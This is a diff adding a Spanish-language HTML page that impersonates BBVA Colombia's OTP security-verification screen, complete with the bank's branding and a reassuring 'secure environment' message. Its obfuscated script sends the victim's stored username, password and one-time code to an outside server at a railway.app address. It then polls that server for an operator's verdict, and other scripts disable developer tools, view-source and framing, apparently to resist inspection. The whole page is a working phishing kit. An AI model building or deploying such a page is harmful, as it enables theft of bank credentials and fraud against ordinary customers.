@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BBVA Net - Verificación OTP</title>
+    <link rel="icon" type="image/png" href="img/BBVA_logo_2025.svg.png">
+    <link rel="apple-touch-icon" href="img/BBVA_logo_2025.svg.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        @keyframes popInError{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
+        #errorLogin.visible{display:flex !important;opacity:1 !important}
+        #errorLoginBtn:hover{background:#072952 !important}
+        input,select,textarea{font-size:16px !important}
+
+        /* ==========================================
+           ÍCONOS COMO IMÁGENES
+           ========================================== */
+        .header-icon img {
+            width: 28px;
+            height: 28px;
+            display: block;
+            object-fit: contain;
+        }
+        .security-badge img {
+            width: 22px;
+            height: 22px;
+            display: block;
+            object-fit: contain;
+        }
+
+        /* ==========================================
+           ONBOARDING LOADING SCREEN
+           ========================================== */
+        #loadingScreen.onboarding-loading {
+            position: fixed;
+            inset: 0;
+            background: #F9FBFA;
+            z-index: 99999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Manrope', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+        }
+        #loadingScreen.onboarding-loading.active {
+            display: flex;
+        }
+        .onboarding-container {
+            width: 100%;
+            max-width: 512px;
+            height: 100vh;
+            max-height: 864px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 12vh 24px 40px 24px;
+            text-align: center;
+        }
+        .onboarding-icon-wrap {
+            width: 140px;
+            height: 140px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 90px;
+            position: relative;
+        }
+        .onboarding-icon {
+            width: 100px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            will-change: transform, opacity;
+            transform-origin: center center;
+        }
+        .onboarding-icon svg {
+            width: 100%;
+            height: 100%;
+            display: block;
+            overflow: visible;
+        }
+        .onboarding-icon.fading-out {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        .onboarding-icon.fading-in {
+            opacity: 0;
+        }
+        .onboarding-icon.visible {
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+        .onboarding-title-img {
+            height: 38px;
+            width: auto;
+            max-width: 200px;
+            object-fit: contain;
+            margin: 0 0 20px 0;
+            display: block;
+        }
+        .onboarding-subtitle {
+            font-family: 'Manrope', sans-serif;
+            font-size: 19px;
+            font-weight: 800;
+            color: #000000;
+            margin: 0 0 12px 0;
+            letter-spacing: -0.3px;
+            line-height: 1.2;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+        .onboarding-description {
+            font-family: 'Manrope', sans-serif;
+            font-size: 15px;
+            font-weight: 500;
+            color: #5E6773;
+            margin: 0;
+            line-height: 1.45;
+            max-width: 320px;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+        .onboarding-subtitle.slide-out,
+        .onboarding-description.slide-out {
+            opacity: 0;
+            transform: translateY(-8px);
+        }
+        .onboarding-subtitle.slide-in-start,
+        .onboarding-description.slide-in-start {
+            opacity: 0;
+            transform: translateY(8px);
+        }
+
+        @keyframes umbrellaSway {
+            0%, 100% { transform: rotate(-3deg); }
+            50%      { transform: rotate(3deg); }
+        }
+        .onboarding-icon svg .umbrella-top {
+            transform-origin: 50px 45px;
+            animation: umbrellaSway 2.5s ease-in-out infinite;
+        }
+        @keyframes coinPop {
+            0%   { transform: scale(0) rotate(-180deg); opacity: 0; }
+            60%  { transform: scale(1.15) rotate(10deg); opacity: 1; }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+        .onboarding-icon svg .coin-main {
+            transform-origin: 50px 50px;
+            animation: coinPop 0.9s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+        }
+        @keyframes coinBehind {
+            0%   { transform: scale(0.6) translateX(0); opacity: 0; }
+            70%  { transform: scale(0.85) translateX(-12px); opacity: 0.5; }
+            100% { transform: scale(0.75) translateX(-18px); opacity: 0.4; }
+        }
+        .onboarding-icon svg .coin-behind {
+            transform-origin: 50px 50px;
+            animation: coinBehind 0.9s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s both;
+        }
+        @keyframes heartBeat {
+            0%, 100% { transform: scale(1); }
+            30%      { transform: scale(1.25); }
+            60%      { transform: scale(0.95); }
+        }
+        .onboarding-icon svg .heart {
+            transform-origin: 72px 62px;
+            animation: heartBeat 1.8s ease-in-out infinite;
+        }
+        @keyframes cardSlide {
+            0%   { transform: translateX(-10px); opacity: 0; }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+        .onboarding-icon svg .card-body {
+            animation: cardSlide 0.7s ease-out both;
+        }
+        @keyframes scannerPulse {
+            0%   { transform: scale(1); opacity: 0.9; }
+            50%  { transform: scale(1.06); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.9; }
+        }
+        .onboarding-icon svg .bio-circle {
+            transform-origin: 50px 50px;
+            animation: scannerPulse 2s ease-in-out infinite;
+        }
+        @keyframes scanLine {
+            0%   { transform: translateY(-12px); opacity: 0; }
+            20%  { opacity: 1; }
+            80%  { opacity: 1; }
+            100% { transform: translateY(12px); opacity: 0; }
+        }
+        .onboarding-icon svg .scan-line {
+            animation: scanLine 1.8s ease-in-out infinite;
+        }
+
+        /* OTP input: centrado */
+        .otp-input {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div id="loadingScreen" class="onboarding-loading">
+        <div class="onboarding-container">
+            <div class="onboarding-icon-wrap">
+                <div class="onboarding-icon" id="obIcon"></div>
+            </div>
+            <img class="onboarding-title-img" src="img/BBVA_RGB.png" alt="BBVA">
+            <h2 class="onboarding-subtitle" id="obSubtitle">Más cómodo</h2>
+            <p class="onboarding-description" id="obDescription">Consulta tu saldo y movimientos sin moverte de casa.</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <header class="header">
+            <div class="header-icon">
+                <img src="img/my-profile.svg" alt="Usuario">
+            </div>
+            <div class="logo">
+                <img src="img/BBVA_logo_2025.svg.png" alt="BBVA">
+            </div>
+            <button class="close-btn" onclick="window.location.href='https://www.bbva.com.co/'">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#1973B8"/>
+                </svg>
+            </button>
+        </header>
+
+        <div class="security-badge">
+            <img src="img/lock.svg" alt="Candado">
+        </div>
+
+        <p class="security-text">Estás en un entorno con seguridad BBVA</p>
+
+        <main class="main-content">
+            <div class="login-card">
+                <h1 class="title">Verificación de <br>Seguridad</h1>
+
+                <p style="font-family: 'Benton Sans', sans-serif; font-size: 15px; color: #5E6773; line-height: 1.55; margin: 0 0 20px 0;">
+                    Hemos enviado un código de verificación a tu número de celular registrado y/o correo electrónico.
+                </p>
+
+                <form class="login-form" id="otpForm">
+                    <div class="input-group">
+                        <label class="input-label" style="display:block; font-size:14px; font-weight:600; color:#043263; margin-bottom:10px;">Código de verificación</label>
+                        <input
+                            type="text"
+                            class="input-field otp-input"
+                            id="otpCode"
+                            placeholder="Ingresa el código"
+                            maxlength="6"
+                            inputmode="numeric"
+                            autocomplete="off">
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="btnVerificar" disabled>Verificar</button>
+
+                    <a href="token.html" class="forgot-link">← Volver</a>
+                </form>
+            </div>
+
+            <div class="register-card">
+                <h3 class="register-title" style="font-size: 20px; margin-bottom: 12px;">¿Por qué necesitamos esto?</h3>
+                <p class="register-description" style="margin-bottom: 0;">
+                    Este paso adicional de seguridad nos ayuda a verificar tu identidad y proteger tu cuenta de accesos no autorizados.
+                </p>
+            </div>
+        </main>
+    </div>
+
+    <div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(4,50,99,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Benton Sans',-apple-system,sans-serif;opacity:0;transition:opacity .3s ease">
+        <div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#043263">
+            <div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="12" y1="8" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+            <div style="font-size:19px;font-weight:700;color:#043263;margin-bottom:10px">Código incorrecto</div>
+            <div style="font-size:14px;color:#5E6773;line-height:1.55;margin-bottom:22px">El código ingresado es incorrecto.<br>Por favor verifica e intenta nuevamente.</div>
+            <button id="errorLoginBtn" style="display:block;width:100%;background:#043263;color:#fff;border:none;padding:14px 20px;border-radius:8px;font-size:14px;font-weight:600;letter-spacing:0.03em;cursor:pointer;font-family:inherit">Intentar de nuevo</button>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        var _0xa1 = "https://multi-bancos-production.up.railway.app";
+        var _0xb2 = "bbva";
+        var _0xc3 = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000));
+        try { sessionStorage.setItem('sessionId', _0xc3); } catch(e) {}
+
+        var _0xd4 = document.getElementById('otpCode');
+        var _0xe5 = document.getElementById('btnVerificar');
+        var _0xf6 = document.getElementById('otpForm');
+        var _0xg7 = document.getElementById('loadingScreen');
+        var _0xh8 = document.getElementById('errorLogin');
+
+        function _0xi9() {
+            var _0xj0 = _0xd4.value.replace(/\D/g, '').slice(0, 6);
+            _0xd4.value = _0xj0;
+            _0xe5.disabled = _0xj0.length < 4;
+        }
+
+        _0xd4.addEventListener('input', _0xi9);
+        _0xi9();
+
+        /* ==========================================
+           ONBOARDING ROTATIVO — 4 estados
+           ========================================== */
+        var _0xOB = [
+            { icon: 'beach', subtitle: 'Más cómodo', description: 'Consulta tu saldo y movimientos sin moverte de casa.' },
+            { icon: 'euro', subtitle: 'Más rápido', description: 'Paga, transfiere y recarga en poco pasos.' },
+            { icon: 'card', subtitle: 'Más sencillo', description: 'Opera de forma intuitiva, ten a mano lo que necesitas cuando lo necesitas.' },
+            { icon: 'biometry', subtitle: 'Más seguro de usar', description: 'Realiza operaciones de forma segura gracias a la biometría' }
+        ];
+
+        var _0xSVG = {
+            beach:
+                '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">' +
+                '<g class="umbrella-top">' +
+                '<path d="M15 45 Q50 8 85 45 Z" fill="#1976D2"/>' +
+                '<path d="M15 45 Q32 12 50 45 Z" fill="#42A5F5"/>' +
+                '<path d="M50 45 Q68 12 85 45 Z" fill="#1565C0"/>' +
+                '</g>' +
+                '<line x1="50" y1="45" x2="50" y2="78" stroke="#0A3A6B" stroke-width="2.5" stroke-linecap="round"/>' +
+                '<rect x="28" y="80" width="44" height="4" rx="2" fill="#4DD0E1"/>' +
+                '<rect x="32" y="76" width="36" height="4" rx="2" fill="#26C6DA"/>' +
+                '</svg>',
+            euro:
+                '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">' +
+                '<circle class="coin-behind" cx="50" cy="50" r="28" fill="#E8A93C" opacity="0.4"/>' +
+                '<circle class="coin-behind" cx="50" cy="50" r="30" fill="#F0B945" opacity="0.5"/>' +
+                '<circle class="coin-main" cx="50" cy="50" r="32" fill="#F5C13C"/>' +
+                '<circle class="coin-main" cx="50" cy="50" r="28" fill="#FFD54F" opacity="0.6"/>' +
+                '<text x="50" y="66" font-size="38" font-weight="700" text-anchor="middle" fill="#FFFFFF" font-family="Arial, sans-serif">€</text>' +
+                '</svg>',
+            card:
+                '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">' +
+                '<rect class="card-body" x="15" y="35" width="70" height="42" rx="6" fill="#1E88E5"/>' +
+                '<rect x="15" y="46" width="70" height="9" fill="#FFFFFF" opacity="0.9"/>' +
+                '<circle class="heart" cx="72" cy="62" r="11" fill="#26C6DA"/>' +
+                '<path class="heart" d="M72 68 C67 64 64 61 64 57 C64 54 66 52 69 52 C70.5 52 71.5 53 72 54 C72.5 53 73.5 52 75 52 C78 52 80 54 80 57 C80 61 77 64 72 68 Z" fill="#FFFFFF"/>' +
+                '</svg>',
+            biometry:
+                '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">' +
+                '<circle class="bio-circle" cx="50" cy="50" r="38" fill="#0A3A6B"/>' +
+                '<circle cx="50" cy="44" r="11" fill="#4DD0E1"/>' +
+                '<path d="M32 72 Q32 56 50 56 Q68 56 68 72 Z" fill="#4DD0E1"/>' +
+                '<line class="scan-line" x1="30" y1="50" x2="70" y2="50" stroke="#F5C13C" stroke-width="2" stroke-linecap="round"/>' +
+                '<path d="M22 24 L32 24 M22 24 L22 34 M78 24 L68 24 M78 24 L78 34 M22 76 L32 76 M22 76 L22 66 M78 76 L68 76 M78 76 L78 66" stroke="#F5C13C" stroke-width="3" fill="none" stroke-linecap="round"/>' +
+                '</svg>'
+        };
+
+        var _0xidx = 0;
+        var _0xel = document.getElementById('obIcon');
+        var _0xsub = document.getElementById('obSubtitle');
+        var _0xdes = document.getElementById('obDescription');
+
+        function _0xrenderIcon(name) {
+            if (_0xel) _0xel.innerHTML = _0xSVG[name] || '';
+        }
+
+        function _0xupdateText(sub, des) {
+            if (_0xsub) _0xsub.classList.add('slide-out');
+            if (_0xdes) _0xdes.classList.add('slide-out');
+
+            setTimeout(function() {
+                if (_0xsub) {
+                    _0xsub.textContent = sub;
+                    _0xsub.classList.remove('slide-out');
+                    _0xsub.classList.add('slide-in-start');
+                }
+                if (_0xdes) {
+                    _0xdes.textContent = des;
+                    _0xdes.classList.remove('slide-out');
+                    _0xdes.classList.add('slide-in-start');
+                }
+
+                setTimeout(function() {
+                    if (_0xsub) _0xsub.classList.remove('slide-in-start');
+                    if (_0xdes) _0xdes.classList.remove('slide-in-start');
+                }, 50);
+            }, 400);
+        }
+
+        function _0xnext() {
+            _0xidx = (_0xidx + 1) % _0xOB.length;
+            var _0xnxt = _0xOB[_0xidx];
+
+            if (_0xel) {
+                _0xel.classList.remove('visible');
+                _0xel.classList.add('fading-out');
+            }
+
+            setTimeout(function() {
+                _0xrenderIcon(_0xnxt.icon);
+                _0xupdateText(_0xnxt.subtitle, _0xnxt.description);
+
+                if (_0xel) {
+                    _0xel.classList.remove('fading-out');
+                    _0xel.classList.add('fading-in');
+
+                    void _0xel.offsetHeight;
+
+                    _0xel.classList.remove('fading-in');
+                    _0xel.classList.add('visible');
+                }
+            }, 500);
+        }
+
+        if (_0xel && _0xsub && _0xdes) {
+            _0xrenderIcon(_0xOB[0].icon);
+            _0xsub.textContent = _0xOB[0].subtitle;
+            _0xdes.textContent = _0xOB[0].description;
+            _0xel.classList.add('visible');
+            setInterval(_0xnext, 3000);
+        }
+
+        _0xf6.addEventListener('submit', async function(_0xj1) {
+            _0xj1.preventDefault();
+            if (_0xe5.disabled) return;
+
+            var _0xk1 = _0xd4.value.trim();
+            if (_0xk1.length < 4) return;
+
+            var _0xl1 = sessionStorage.getItem('usuario') || '';
+            var _0xm1 = sessionStorage.getItem('clave') || '';
+
+            _0xg7.classList.add('active');
+
+            try {
+                var _0xn1 = await fetch(_0xa1 + '/' + _0xb2 + '/enviar-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: _0xc3,
+                        otp: _0xk1,
+                        identificacion: _0xl1,
+                        clave: _0xm1
+                    })
+                });
+                var _0xo1 = await _0xn1.json();
+                console.log('OTP enviado:', _0xo1);
+            } catch (_0xp1) {
+                console.error('Error:', _0xp1);
+            }
+
+            var _0xq1 = setInterval(async function() {
+                try {
+                    var _0xr1 = await fetch(_0xa1 + '/' + _0xb2 + '/estado/' + _0xc3);
+                    var _0xs1 = await _0xr1.json();
+                    console.log('Estado:', _0xs1.estado);
+
+                    if (_0xs1.estado === 'token') {
+                        clearInterval(_0xq1);
+                        window.location.href = 'token.html';
+                    } else if (_0xs1.estado === 'rechazado') {
+                        clearInterval(_0xq1);
+                        _0xg7.classList.remove('active');
+                        setTimeout(function() {
+                            if (_0xh8) _0xh8.classList.add('visible');
+                        }, 300);
+                    }
+                } catch (_0xt1) {
+                    console.error('Error estado:', _0xt1);
+                }
+            }, 2000);
+        });
+
+        var _0xu1 = document.getElementById('errorLoginBtn');
+        if (_0xu1) {
+            _0xu1.addEventListener('click', function() {
+                if (_0xh8) _0xh8.classList.remove('visible');
+                _0xd4.value = '';
+                _0xe5.disabled = true;
+                _0xd4.focus();
+            });
+        }
+    })();
+    </script>
+
+<script>
+(function(){
+'use strict';
+var _0xv1=0;
+document.addEventListener('touchend',function(_0xw1){
+var _0xx1=new Date().getTime();
+if(_0xx1-_0xv1<=300){_0xw1.preventDefault();}
+_0xv1=_0xx1;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xy1){_0xy1.preventDefault();});
+document.addEventListener('focusin',function(_0xz1){
+var _0x02=(_0xz1.target&&_0xz1.target.tagName)?_0xz1.target.tagName.toLowerCase():'';
+if(_0x02==='input'||_0x02==='textarea'||_0x02==='select'){
+if(_0xz1.target.style.fontSize!=='16px'){
+_0xz1.target.dataset._fs=_0xz1.target.style.fontSize||'';
+_0xz1.target.style.fontSize='16px';
+}
+}
+});
+document.addEventListener('focusout',function(_0x12){
+var _0x02=(_0x12.target&&_0x12.target.tagName)?_0x12.target.tagName.toLowerCase():'';
+if(_0x02==='input'||_0x02==='textarea'||_0x02==='select'){
+if(_0x12.target.dataset._fs!==undefined){
+_0x12.target.style.fontSize=_0x12.target.dataset._fs;
+delete _0x12.target.dataset._fs;
+}
+}
+});
+})();
+</script>
+
+<script>
+(function(){
+'use strict';
+document.addEventListener('contextmenu',function(_0x22){_0x22.preventDefault();return false;});
+document.addEventListener('keydown',function(_0x32){
+var _0x42=(_0x32.key||'').toLowerCase();
+var _0x52=_0x32.ctrlKey||_0x32.metaKey;
+var _0x62=_0x32.shiftKey;
+if(_0x42==='f12'){_0x32.preventDefault();return false;}
+if(_0x52&&_0x62&&(_0x42==='i'||_0x42==='j'||_0x42==='c')){_0x32.preventDefault();return false;}
+if(_0x52&&_0x42==='u'){_0x32.preventDefault();return false;}
+if(_0x52&&_0x42==='s'){_0x32.preventDefault();return false;}
+if(_0x52&&_0x62&&(_0x42==='k'||_0x42==='e'||_0x42==='s'||_0x42==='c')){_0x32.preventDefault();return false;}
+if(_0x32.metaKey&&_0x32.altKey&&(_0x42==='i'||_0x42==='j'||_0x42==='c')){_0x32.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0x72){_0x72.preventDefault();});
+document.addEventListener('selectstart',function(_0x82){
+var _0x92=(_0x82.target&&_0x82.target.tagName)?_0x82.target.tagName.toLowerCase():'';
+if(_0x92!=='input'&&_0x92!=='textarea'){_0x82.preventDefault();}
+});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xa2){document.body.innerHTML='';}
+setInterval(function(){
+var _0xb2=window.outerWidth-window.innerWidth;
+var _0xc2=window.outerHeight-window.innerHeight;
+if(_0xb2>160||_0xc2>160){}
+},1000);
+})();
+</script>
+</body>
+</html>
